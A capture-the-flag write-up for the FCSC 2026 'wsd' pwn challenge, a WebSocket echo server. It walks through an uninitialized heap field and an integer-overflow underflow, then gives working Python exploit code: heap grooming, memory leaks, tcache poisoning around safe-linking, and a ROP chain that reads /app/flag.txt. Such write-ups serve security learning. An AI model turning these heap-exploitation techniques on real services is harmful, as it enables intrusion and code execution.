
# FCSC 2026 - PWN - wsd

Level : :star: :star:
Solve during the CTF: 8
Description :
Vous avez adoré la trilogie HTTP, je vous présente alors wsd, c'est presque pareil, mais différent.
Récupérez le flag dans /app/flag.txt.

# TL;DR

Exploit an uninitialized heap memory containing a buffer pointer, and its size, to :
    - leak data (Heap, Libc, Stack and PIE),
    - tcache poisoning to get arbitrary write,
Finally write a ROP chain on the stack to read the flag and send it back to the client.

# Description

The binary is a TCP server that handles WebSocket connections. 

The protocol is simple: the client sends an HTTP WebSocket upgrade request. If the handshake succeeds, the binary switches to WebSocket mode and **echoes back** every message it receives. It supports **fragmentation**: a message can be split across several frames (opcode `CONTINUATION`), and the binary reassembles them before echoing.

`server_handle_client` implements the main loop:
1. Read the HTTP request, parse it, attempt the WebSocket handshake.
2. On failure, send back a 400 and continue: the connection stays open.
3. On success, switch to WebSocket mode.

# Vulnerabilities

The primary vulnerability is an **uninitialized heap memory** in `ws_session_create`:

``` c
/* WebSocket session */
struct ws_session {
    enum ws_state     state;

    /* Fragmentation state */
    enum ws_opcode    frag_opcode; /* the opcode of the initial fragment */
    size_t            frag_len;    /* current length of the fragmented message */
    uint8_t          *frag_buf;    /* accumulated payload for fragments */
};

struct ws_session *ws_session_create(struct ws_client *client)
{
    struct ws_session *s;
    s = malloc(sizeof(*s));     // ← raw malloc, NO zero-initialization
    if (!s)
        return NULL;
    s->state  = WS_STATE_OPEN;  // ← ONLY field initialized
    
    return s;                   // frag_opcode, frag_len, frag_buf = GARBAGE
}
```

`malloc` does not zero memory. `frag_len` and `frag_buf` contain whatever bytes were left in the recycled heap chunk.

`ws_session` is 4×8 = 32 bytes: a **0x30 tcache chunk**.

```
  ┌──────────────────┬────────┬──────────────────────────────────────────────────────┐
  │ ws_session field │ Offset │           Chunk content after tcache free            │
  ├──────────────────┼────────┼──────────────────────────────────────────────────────┤
  │ state            │ +0     │ tcache next ptr                                      │
  ├──────────────────┼────────┼──────────────────────────────────────────────────────┤
  │ frag_opcode      │ +8     │ tcache key                                           │
  ├──────────────────┼────────┼──────────────────────────────────────────────────────┤
  │ frag_len         │ +16    │ original chunk bytes [16–23] — attacker-controlled   │
  ├──────────────────┼────────┼──────────────────────────────────────────────────────┤
  │ frag_buf         │ +24    │ original chunk bytes [24–31] — attacker-controlled   │
  └──────────────────┴────────┴──────────────────────────────────────────────────────┘
```

During HTTP parsing, `strdup` calls for header names/values of 17–32 characters produce `0x30` chunks, which are freed once the handshake is done, whether it is a success or a failure.

By sending a **crafted failing handshake first**, we can populate the `0x30` tcache with a malicious size and pointer.
When `ws_session_create` later pops that chunk, the malicious size and pointer are used as `frag_len` and `frag_buf`.

---

The second vulnerability is an **integer overflow** in the `CONTINUATION` frame handler:

``` c
} else if (frame->opcode == WS_OP_CONTINUATION) {
    if (frame->payload_len > 0) {
        size_t new_len = session->frag_len + frame->payload_len;
        if (new_len > WSD_MAX_FRAME_SIZE) {             
            ...
        }
        uint8_t *tmp = realloc(session->frag_buf, new_len);
        ...
        session->frag_buf = tmp;
        memcpy(session->frag_buf + session->frag_len,
               frame->payload, frame->payload_len);
        session->frag_len = new_len;
    }
```

Both `session->frag_len` (`size_t`) and `frame->payload_len` (`uint64_t`) are unsigned 64-bit values. Their addition can wrap around: if `frag_len` is very large (for instance `0xFFFFFFFFFFFFFF8`, achievable through the previous vulnerability), adding a small `payload_len` like 0x48 produces:

```
new_len = 0xFFFFFFFFFFFFFFF8 + 0x48 = 0x40   // wraps around mod 2^64
```

The size check `new_len > WSD_MAX_FRAME_SIZE`, then:
- `realloc(frag_buf, 0x40)` allocates a 0x50 chunk,
- `memcpy(frag_buf + 0xFFFFFFFFFFFFFFF8, payload, 0x48)` pointer arithmetic wraps it to `frag_buf - 8`, writing 8 bytes before the buffer (heap underflow)

The underflow allow us to modify the chunk's size field in the heap metadata. By crafting the payload, we can overwrite it to make realloc believe the buffer is larger than it really is. On the next `CONTINUATION` frame, `realloc` skips reallocation and `memcpy` writes past the real chunk boundary; giving us a heap overflow.

# Nominal

Before exploiting anything, let's implement the WebSocket protocol to talk to the binary.

WebSocket is a bidirectional protocol that upgrades from HTTP. Data is then wrapped in **frames**:

```
Byte 0: FIN(1 bit) | RSV(3 bits) | Opcode(4 bits)
Byte 1: MASK(1 bit) | Payload length(7 bits)
[2 or 8 extra bytes if length == 126 or 127]
[4-byte mask key, if MASK=1]
[payload, XOR'd with the mask key for client→server frames]
```

Client to server frames **must** be masked. Server to client frames are not masked.

The HTTP upgrade handshake looks like:
```
GET / HTTP/1.1
Host: localhost:4000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64 of 16 random bytes>
Sec-WebSocket-Version: 13
```

In this binary the `Sec-WebSocket-Version` field must be `"13"`, and the version (here `HTTP/1.1`) is ignored.

For fragmentation: a frame with `FIN=0` starts a fragmented message. Following frames use opcode `CONTINUATION`. The final frame has `FIN=1`: that's when the server echoes the fully re-assembled message back.

``` py
# ─── Constants ────────────────────────────────────────────────────────────────────
WS_OP_CONTINUATION = 0x0
WS_OP_TEXT         = 0x1
WS_OP_BINARY       = 0x2
WS_OP_CLOSE        = 0x8
WS_OP_PING         = 0x9
WS_OP_PONG         = 0xA

def ws_build_frame(opcode: int, payload: bytes = b"", fin: bool = True) -> bytes:
    b0   = (0x80 if fin else 0x00) | (opcode & 0x0F)
    plen = len(payload)

    if plen <= 125:
        hdr = bytes([b0, 0x80 | plen])
    elif plen <= 0xFFFF:
        hdr = bytes([b0, 0x80 | 126]) + struct.pack(">H", plen)
    else:
        hdr = bytes([b0, 0x80 | 127]) + struct.pack(">Q", plen)

    mask        = os.urandom(4)
    masked_data = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return hdr + mask + masked_data


def ws_send(tube: tube, opcode: int, payload: bytes = b"", fin: bool = True) -> None:
    tube.send(ws_build_frame(opcode, payload, fin=fin))

def ws_handshake(tube: tube, custom_http_req: str = None, log_resp: bool = False) -> None:

    if custom_http_req: 
        http_req = custom_http_req
    else:
        key_bytes = os.urandom(16)
        key       = base64.b64encode(key_bytes).decode()

        http_req = (
            f"GET / HTTP/1.1\r\n"                   # Note: the version field is actually ignored
            f"Host: localhost:4000\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"\r\n"
        ).encode()

    tube.send(http_req)

    resp = tube.recvuntil(b"\r\n\r\n", timeout=5)
    if log_resp :
        if b"101" not in resp:
            log.failure(f"Handshake failed:\n{resp.decode(errors='replace')}")
        else:
            log.success("WebSocket handshake OK")

def ws_recv(tube: tube) -> tuple[int, bytes, bool]:
    h      = tube.recv(2)
    fin    = bool(h[0] & 0x80)
    opcode = h[0] & 0x0F
    plen   = h[1] & 0x7F       # mask bit always 0 for server frames

    if plen == 126:
        plen = struct.unpack(">H", tube.recv(2))[0]
    elif plen == 127:
        plen = struct.unpack(">Q", tube.recv(8))[0]

    payload = tube.recv(plen) if plen else b""
    return payload
```

With those function, we can start the communication with the binary. 

For instance, the following code:

``` py
bin, _ = connect(do_log=False)

ws_handshake(bin)
ws_send(bin, WS_OP_CONTINUATION, b"Hello ", False)
ws_send(bin, WS_OP_CONTINUATION, b"World", True)
log.info("Server send: %s", ws_recv(bin))

close(do_log=False)
```

Produces the following result:

``` sh
$ python3 perso.py REMOTE=localhost:4000
[*] Server send: b'Hello World'
``` 

The binary received two frames, re-assembled them and send the message back to the client.

# Exploit

To build the exploit, we first work under GDB with ASLR disabled. This lets us identify the relative offsets between values we can leak and the targets we want to reach.
These offsets **should** be constant. Spoiler: they were not.

## Protections

``` sh
$ checksec --file=wsd
[*] '/home/kali/training/CTF/2026_FCSC/pwn/wsd/wsd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

PIE is enabled, no information on the ASLR but we will consider it to be active, and the binary is dynamically linked against a provided libc (version 2.41: a recent one with tcache safe-linking).

As usual, we need to leak heap, libc, stack and PIE before doing anything useful.

The good news: the fact that each client is a forked process means that the memory layout is the same across connections (until the binary is re-launched).

## The arbitrary read primitive

With `frag_len = -8` in the session and `frag_buf` pointing to a `0x50` chunk located before `ws_session` on the heap, we can set up the following layout on the heap (by doing some heap-grooming magic with the chunks allocated during the HTTP parsing):

```
  ┌─────────────────────────────────────────────┐ ───────────────────────────── session->frag_buf (0x50 chunk)
  │  prev_size  │  size (0x51)                  │<--- the underflow hits here
  │─────────────────────────────────────────────│
  │             user data (0x40 bytes)          │<--┐
  ├═════════════════════════════════════════════╡ ───────────────────────────── ws_session (0x30 chunk)
  │  prev_size  │  size (0x31)                  │   │
  │─────────────────────────────────────────────│   │
  │  +0   state        │  WS_STATE_OPEN (0)     │   │
  │  +8   frag_opcode  │  tcache key (garbage)  │   │
  │  +16  frag_len     │  0xfffffffffffffff8    │   │
  │  +24  frag_buf     │  -> chunk above     ---│---┘
  └─────────────────────────────────────────────┘
```

Once the `ws_session` re-use the chunk where we set the forged `frag_len`, we use the following frames:

**Frame 1 — CONTINUATION, FIN=0, 0x48 bytes** — payload = `p64(0x81) + b'W'*0x40`:

```
new_len = 0xfffffffffffffff8 + 0x48 = 0x40
tmp = realloc(frag_buf, 0x40)               // a 0x50 chunk from the tcache, that we placed right before the ws_session chunk
session->frag_buf = tmp                    
memcpy(frag_buf + (-8), payload, 0x48)      // Overriding the SIZE FIELD of the chunk
session->frag_len = 0x40
```
      
We write `0x81` at `frag_buf - 8`, modifying the SIZE FIELD of the `frag_buf` chunk: it now appears to be a 0x80 bytes chunk, overlaping the one containing the `ws_session`.
The remaining of the payload (`W*0x40`) fills the chunk's data to reallocate into the `0x50` chunk that we want.

```
  ┌─────────────────────────────────────────────┐ ───────────────────────────── session->frag_buf (0x50 chunk)
  │  prev_size  │  size (0x81)                  │<--- Modified SIZE
  │─────────────────────────────────────────────│
  │               W * 0x40                      │<--┐
  ├═════════════════════════════════════════════╡ ───────────────────────────── ws_session (0x30 chunk)
  │  prev_size  │  size (0x31)                  │   │
  │─────────────────────────────────────────────│   │
  │  +0   state        │  WS_STATE_OPEN (0)     │   │
  │  +8   frag_opcode  │  tcache key (garbage)  │   │
  │  +16  frag_len     │  0xfffffffffffffff8    │   │
  │  +24  frag_buf     │  → chunk above     ----│---┘
  └─────────────────────────────────────────────┘
```

**Frame 2 — CONTINUATION, FIN=1, 0x30 bytes**:

Payload :
``` sh
+0x00 : p64(0)     → prev_size of ws_session chunk
+0x08 : p64(0x31)  → chunk size of ws_session chunk
+0x10 : p64(0)     → ws_session.state
+0x18 : p64(0)     → ws_session.frag_opcode
+0x20 : p64(0)     → ws_session.frag_len
+0x28 : addr       → ws_session.frag_buf = target address <- the primitive
```

```
new_len = 0x40 + 0x30 = 0x70
realloc(frag_buf, 0x70)                 // no reallocation since we artificially modified the chunk size to 0x80
memcpy(frag_buf + 0x40, payload, 48)    // writes into `ws_session` chunk
session->frag_len = new_len;
```

The `realloc` statement keep the same chunk since its size is now `0x80`, and the `memcpy` will write into `ws_session`'s chunk, allowing us to modify the value of `frag_buf`.
Note that the value we set for `frag_len` is overwritten. 

Since `FIN=1`, the server calls `ws_send_frame(session->frag_buf, session->frag_len)` = **0x70 bytes read from `addr`** -> Arbitrary read.

``` py
def read_addr(addr):

    bin, _ = connect(do_log=False)

    http_req = (
        b"GET / HTTP/1.1\r\n" +
        b"A"*0x450 + b": " + b"B"*0xC0 + b"\r\n" +                                       # large chunk (0x450) -> will land in unsorted bin, will be usefull later
        b"E"*0x40 + b": " + b"F"*0x40 + b"\r\n" +                                        # 0x50 chunks, the first one in the tcache bin, last one becomes frag_buf
        b'C' * 16 + b'\xf8\xff\xff\xff\xff\xff\xff\xff' + b": " + b"D"*0x40 + b"\r\n" +  # 0x30 chunk with frag_len=-8, will be used as ws_session
        b"A"*30 + b": " + b"B"*0xC0 + b"\r\n" +
        b"\r\n"
    )

    # fake handshake for heap grooming: populates the bins (tcache & unsorted bins)
    ws_handshake(bin, http_req)
    
    # real handshake: ws_session_create pulls the poisoned 0x30 chunk from tcache
    ws_handshake(bin)

    payload = p64(0x81)                                             # new size for frag_buf chunk
    payload += b'W' * 0x40                                          # pad to chunk boundary
    ws_send(bin, WS_OP_CONTINUATION, payload=payload,  fin=False)

    payload  = p64(0)                   # PREV_SIZE, not used
    payload += p64(0x31)                # ws_session chunk size to keep it valid
    payload += p64(0)
    payload += p64(0)
    payload += p64(0x0)                 # frag_len, overridden by new_len
    payload += addr                     # frag_buf -> target address
    ws_send(bin, WS_OP_CONTINUATION, payload=payload,  fin=True)

    leak = ws_recv(bin)

    close(do_log=False)

    return leak
```

## Leak 1 — Heap

We use the previous fonction to leak an address on the heap. To do that, we use the 0x50 chunk in the tcache bins that we placed before `frag_buf`.
Since this chunk is in a tcache bin (a single linked list) its first 8 bytes hold a forward pointer to the next free chunk in that bin.

For this first leak, we do not overwrite the `frag_buf` entirely, just its 8 LSB.
With `addr = b'\x00'` (null LSB) we land inside the 0x50 tcache chunk that is before.

Here is the heap state visible in GDB after Frame 1:

``` sh
pwdbg> vis --all

0x555555564970	0x0000000000000340	0x00000000000000d0	@...............
0x555555564980	0x0000000555555564	0x6314dca17f354710	dUUU.....G5....c	 <-- tcachebins[0xd0][1/2]
0x555555564990	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649a0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649b0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649c0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649d0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649e0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x5555555649f0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x555555564a00	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB    <--------------------------- 
0x555555564a10	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB                                │
0x555555564a20	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB                                │
0x555555564a30	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB                                │
0x555555564a40	0x0000000000000000	0x0000000000000051	........Q.......                                │
0x555555564a50	0x0000000555555564	0x6314dca17f354710	dUUU.....G5....c	 <-- tcachebins[0x50][0/1]  │
0x555555564a60	0x4545454545454545	0x4545454545454545	EEEEEEEEEEEEEEEE                                │
0x555555564a70	0x4545454545454545	0x4545454545454545	EEEEEEEEEEEEEEEE                                │ With modified ptr
0x555555564a80	0x4545454545454545	0x4545454545454545	EEEEEEEEEEEEEEEE                                │ 0x0000555555564a00
0x555555564a90	0x0000000000000000	0x0000000000000051	........Q.......                                │
0x555555564aa0	0x0000555000031f34	0x0000000000000000	4...PU..........    <----                       │
0x555555564ab0	0x4646464646464646	0x4646464646464646	FFFFFFFFFFFFFFFF        │                       │
0x555555564ac0	0x4646464646464646	0x4646464646464646	FFFFFFFFFFFFFFFF        │ With original ptr     │
0x555555564ad0	0x4646464646464646	0x4646464646464646	FFFFFFFFFFFFFFFF        │ 0x0000555555564aa0    │
0x555555564ae0	0x0000000000000000	0x0000000000000031	........1.......        │                       │
0x555555564af0	0x0000000000000000	0x0000000000000000	................        │                       │
0x555555564b00	0xfffffffffffffff8	0x0000555555564aa0	.........JVUUU..    ---------------------------
0x555555564b10	0x0000000000000000	0x0000000000000051	........Q.......
0x555555564b20	0x0000000000000081	0x5757575757575757	........WWWWWWWW
```

Since we have a libc 2.41, tcache pointers are XOR-protected (safe-linking):

```
encrypted = plaintext_next XOR (chunk_address >> 12)
```

However if the chunk is the **only one** in its bin, `next = NULL`, so:

```
encrypted = 0 XOR (chunk_address >> 12) = chunk_address >> 12
```

We can directly recover the heap address by left-shifting:

``` py
leak = read_addr(b'\x00')
marker = p64(0x51)                      # find the 0x50 chunk header inside the leak
idx = leak.index(marker)
leak = leak[idx + len(marker):][:8]
key = u64(leak[0:8])
heap_base_page = key << 12              # un-XOR: next=NULL so encrypted = addr>>12
log.info(f"Key leaked: {hex(key)}")
log.success(f"Heap base page : {hex(heap_base_page)}")
```

We can leak the value `0x0000000555555564`.
-> We have a leak of a heap page: `0x555555564 << 12 = 0x55555556400`

## Leak 2 — Libc

During heap grooming, we allocated a 0x460 chunk.
Chunks this large go in the **unsorted bin** when freed. In the unsorted bin, the `fd`/`bk` pointers point to `main_arena`: a libc address.

The offset from `heap_base_page` to this chunk is constant, so:

``` py
leak = read_addr(p64(heap_base_page + 0x680))   # points into the unsorted bin chunk
leak = leak[0:8]
libc_leak = u64(leak)
log.success(f"Libc pointer leaked: {hex(libc_leak)}")
```

I expected that the offset between the leaked pointer and `libc_base` would be fixed for a given libc, but for some reason it wasn't.
So I just brute-forced a small range around the offset found with GDB, reading a few bytes until I found the ELF magic:

``` py
# TODO Why is this OFFSET variable? 
for offset in range(0x1D0080, 0x1EF080 + 1, 0x1000):
    libc_base = libc_leak - offset
    leak = read_addr(p64(libc_base))
    leak = leak[0:8]
    if b'ELF' in leak:
        log.success(f"Found libc base at offset 0x{offset:X} -> 0x{libc_base:X}")
        break
else:
    log.error('Could not found good offset from the leaked pointer...')
    exit(0)
```

## Leak 3 — Stack

The libc contains the pointer `__environ`, a pointer to the environment variable array on the **stack**.

```
pwndbg> p/x (void*)__environ
$1 = 0x7fffffffdc08

pwndbg> telescope 0x7fffffffdc08
00:0000│ r13 0x7fffffffdc08 —▸ 0x7fffffffe00e ◂— 'SHELL=/bin/bash'
01:0008│     0x7fffffffdc10 —▸ 0x7fffffffe01e ◂— 'WINDOWID=0'
...
```

 We can read it to leak an address on the stack:

``` py
leak = read_addr(p64(libc.symbols['__environ']))
leak = leak[0:8]
stack_leak = u64(leak)
log.success(f"Stack leak: {hex(stack_leak)}")
```

## Leak 4 — PIE

At offset `__environ - 0x78` there is a saved return address on the stack pointing into the first instruction of `main` function:

```
pwndbg> telescope (0x7fffffffdc08-0x78)
00:0000│ 0x7fffffffdb90 —▸ 0x555555555349 (main) ◂— push rbp
```

``` py
addr = stack_leak - 0x78
pie_leak = u64(read_addr(p64(addr))[0:8])
elf.address = pie_leak - elf.symbols['main']
log.success("Leaked PIE : 0x%x", elf.address)
```

## Arbitrary write — tcache poisoning

We now have all four leaks. The remaining step is an **arbitrary write** to place a ROP chain on the stack.
For this we used **tcache poisoning**.

We use the same underflow found previously to overwrite the `next` pointer of a free tcache chunk with our target address (XOR-encrypted with safe-linking).

``` py
def poison_tcache(heap_page, target_addr, content):

    bin, _ = connect(do_log=False)

    http_req = (
        b"A"*0x40  + b" "   + b"B"*0x100   + b" HTTP/1.1\r\n" +                 # 'A' chunk = frag_buf    / 'B' chunk of size 0x100
        b"C"*0x100 + b": " + b'D'*16  + p64(0xfffffffffffffff8) + b"\r\n" +     # 'C' chunk of size 0x100 / ws_session chunk
        b"E"*0x20  + b": " + b": " + b"F"*0x40 + b"\r\n" 
        b"\r\n"
    )

    ws_handshake(bin, http_req)
    ws_handshake(bin)

    payload = p64(0x271)                # new chunk A size: spans chunk A (0x50) + B (0x110) + C (0x110)
    payload += b'W' * 0x40              # pad to reach the chunk just above B
    ws_send(bin, WS_OP_CONTINUATION, payload=payload,  fin=False)

    chunk_addr = heap_page + 0x640
    encrypted_next = (target_addr) ^ (chunk_addr >> 12)

    payload = p64(0)
    payload += p64(0x111)                # chunk B size
    payload += p64(0xdeadc0de) * 2 * 16
    payload += p64(0x111)                # chunk C size
    payload += p64(0)
    payload += p64(encrypted_next)       # forged tcache next -> target_addr
    payload += p64(0xdeadc0de)
    payload += b'/app/flag.txt\0\0\0'    # the flag path, placed at a known heap offset
    payload += p64(0xdeadc0de)
    payload += p64(0xdeadc0de) * 2 * 14

    ws_send(bin, WS_OP_CONTINUATION, payload=payload,  fin=True)

    ws_recv(bin)    # junk echo

    # This send triggers two malloc(0x110) internally;
    # the second one returns target_addr and the content is written there.
    ws_send(bin, WS_OP_BINARY, payload=content,  fin=False)

    flag = bin.recvline(drop=True)
    log.success('Flag : %s', flag.decode('UTF-8'))

    close(do_log=False)
```

The heap grooming for `poison_tcache` arranges one 0x50 chunk (`frag_buf`) that will overlap two adjacent 0x110 chunks (B and C). The underflow modifies A's size to make chunk A appear to span over B and C. 
The second `CONTINUATION` frame then writes into B and C, forging C's encrypted `next` pointer:

```python
chunk_addr = heap_page + 0x640                          # known address of chunk C, offset constant between each run
encrypted_next = target_addr ^ (chunk_addr >> 12)       # safe-linking XOR
```

After two `malloc(0x110)`, the second one returns a chunk at `target_addr`. 

Now that we have an arbitrary write, we can setup a ROP chain on the stack.

The target is the return address of `ws_handle_frame` on the stack. We find the offset relative to `__environ`:

```
pwndbg> telescope (0x7fffffffdc08-0x260)
00:0000│-008     0x7fffffffd9a8 ◂— 6
01:0008│ rbp     0x7fffffffd9b0 —▸ 0x7fffffffda00
02:0010│+008     0x7fffffffd9b8 —▸ 0x555555556e7f (ws_on_data+128)   <- return address

pwndbg> info frame
Stack level 0, frame at 0x7fffffffd9c0:
 rip = 0x55555555683c in ws_handle_frame (ws.c:314); saved rip = 0x555555556e7f
 ...
 Saved registers:
  rbp at 0x7fffffffd9b0, rip at 0x7fffffffd9b8
```

`__environ - 0x258` points to the return address of `ws_handle_frame`.


## ROP chain

We need a ROP chain that:
1. `open("/app/flag.txt", O_RDONLY)`    -> open the flag
2. `read(3, heap_buf, 0x100)`           -> read the flag into a heap buffer at a known address
3. `write(4, heap_buf, 0x100)`          -> send it over the client socket (fd 4, the `accept()`-returned fd)

We wrote `/app/flag.txt` in our chunk at a known address during the tcache poisoning (`heap_base_page + 0xa90`).

``` py
# 0x000000000002a145 : pop rdi ; ret
# 0x000000000002baa9 : pop rsi ; ret
# 0x000000000008f0c5 : pop rdx ; pop rbx ; ret
# 0x000000000002846b : ret 

target_addr = stack_leak - 0x258                     # return address stored here

pop_rdi     = libc.address + OFFSET_POP_RDI_RET
pop_rsi     = libc.address + OFFSET_POP_RSI_RET
pop_rdx_rbx = libc.address + OFFSET_POP_RDX_RBX_RET 
ret         = libc.address + OFFSET_RET 

flag_str = heap_base_page + 0xa90
heap_buf = heap_base_page
socket_fd = 4

rop  = p64(0xdeadc0de)

# open("/app/flag.txt", O_RDONLY)
rop += p64(pop_rdi)
rop += p64(flag_str)
rop += p64(pop_rsi)
rop += p64(0)                       # O_RDONLY = 0
rop += p64(libc.symbols['open'])

# read(3, heap_buf, 0x100)
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(heap_buf)
rop += p64(pop_rdx_rbx)
rop += p64(0x100)
rop += p64(0)
rop += p64(libc.symbols['read'])

# write(4, heap_buf, 0x100)
rop += p64(pop_rdi)
rop += p64(socket_fd)
rop += p64(pop_rsi)
rop += p64(heap_buf)
rop += p64(pop_rdx_rbx)
rop += p64(0x100)
rop += p64(0)
rop += p64(libc.symbols['write'])

payload = rop
payload += b'A'*(0x100-len(rop))

poison_tcache(heap_base_page, target_addr, payload)
```

And that's it:

``` sh
$ python3 exploit.py REMOTE=localhost:4000
[*] Key leaked: 0x5629f7176
[+] Heap base page : 0x5629f7176000
[+] Libc pointer leaked: 0x7fe8b9ec7080
[+] Found libc base at offset 0x1EB080 -> 0x7FE8B9CDC000
[+] Stack leak: 0x7ffcd6ee2a68
[+] Leaked PIE : 0x5629c0682000
[+] Flag : FCSC{flag_placeholder}
```